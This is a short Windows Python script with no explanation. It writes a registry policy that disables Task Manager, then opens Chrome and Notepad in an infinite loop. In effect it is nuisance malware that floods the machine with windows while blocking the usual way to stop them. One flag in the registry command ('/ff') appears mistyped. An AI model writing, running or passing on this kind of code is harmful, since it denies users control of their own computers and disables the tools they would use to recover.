import os
import subprocess

# subprocess.run('mkdir ola')

def disableTaskMng():
    os.system('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /ff')
    os.system('start chrome')

disableTaskMng()

while True:
    os.system('start chrome')
    os.system('notepad')